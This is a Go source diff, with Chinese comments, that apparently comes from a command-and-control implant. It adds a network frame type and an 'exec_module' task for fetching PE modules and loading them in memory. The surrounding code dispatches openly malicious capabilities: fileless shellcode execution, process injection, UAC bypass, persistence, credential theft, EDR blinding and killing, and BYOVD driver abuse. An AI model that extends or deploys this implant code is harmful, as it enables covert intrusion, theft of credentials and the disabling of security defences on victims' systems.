@@ -146,6 +146,10 @@ const (
 	TypeRelay     = 0x0B // 链式回连：中继节点转发的子会话帧
 	TypeScreenFrame = 0x0C // 实时屏幕流：屏幕帧
 	TypeRelayStatus = 0x0D // 中继节点监听状态上报（{addr}，空=已停止）
+	// TypeModuleData（v1.4.0 S4）：内存模块二进制下行帧。
+	// 只有 -tags execmodule 的构建会处理它（xload_windows.go）；默认构建里
+	// 由 xload_stub.go 显式忽略 —— 帧类型常量本身不改变默认行为。
+	TypeModuleData = 0x0E
 
 	// 帧类型字节：4B 长度前缀之后，0=控制帧(AES-GCM)，1=隧道帧(XOR)。
 	// 不使用长度高位标记，避免长度值 ≥ 2^31 被中间代理误判为超大包而吞帧。
@@ -986,6 +990,13 @@ func processData(data []byte) {
 	case TypeShellClose:
 		handleShellClose()
 
+	case TypeModuleData:
+		// v1.4.0 S4：内存模块二进制下行帧（[4B 头长][头 JSON][裸字节]）。
+		// 只做解析 + sha256 校验 + 按 token 暂存，真正的加载发生在随后的
+		// exec_module 任务里（读循环必须保持轻量）。
+		// 未编译 execmodule 的构建由 xload_stub.go 显式忽略本帧。
+		handleXData(packet)
+
 	case TypeTunnel:
 		// Payload = [4B total_len][4B len0][pkt0][4B len1][pkt1]...
 		if len(packet.Payload) >= 4 {
@@ -1045,7 +1056,10 @@ func isHeavyTask(taskType string) bool {
 		"fileless_exec", "process_inject", "process_spoof", "auto_inject",
 		"injection", "spawn", "uac_bypass", "persistence", "credentials",
 		"edr_blind", "edr_kill", "byovd_load", "byovd_unload", "byovd_kill", "ppl_kill",
-		"av_detect":
+		"av_detect",
+		// v1.4.0 S4：模块是独立 PE，执行时长不受本进程控制（映射+执行+可能的
+		// 线程等待），按重活任务走独立 goroutine 与更长的超时窗口。
+		"exec_module":
 		return true
 	default:
 		return false
@@ -1698,6 +1712,10 @@ func executeTask(task Task) Result {
 	case "fileless_exec":
 		// 全内存无文件执行：shellcode / BOF / DLL 三类载荷均不落盘执行
 		output, exitCode, errMsg = handleFilelessExec(task.Data)
+	case "exec_module":
+		// v1.4.0 S4：按需加载内存模块（任务里只有一次性 token，二进制走
+		// TypeModuleData 帧）。未编译 execmodule 的构建返回明确的"未包含"错误。
+		output, exitCode, errMsg = handleXLoad(task.Data)
 	case "tunnel":
 		processTaskData(task.Data)
 		return Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: 0, Output: "tunnel processed"}
@@ -1785,7 +1803,9 @@ func executeTask(task Task) Result {
 	}
 
 	// Windows下将输出从GBK转换为UTF-8（file_list/av_detect 除外，它们的输出本身已是 UTF-8）
-	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" {
+	// exec_module 同样排除：模块输出的 UTF-8 文本经 GBK 转换会被打成乱码
+	// （实测"镜像已释放…"这类中文尾注被转坏），而模块输出本来就该是 UTF-8。
+	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" && task.TaskType != "exec_module" {
 		output = string(gbkToUTF8([]byte(output)))
 	}
 
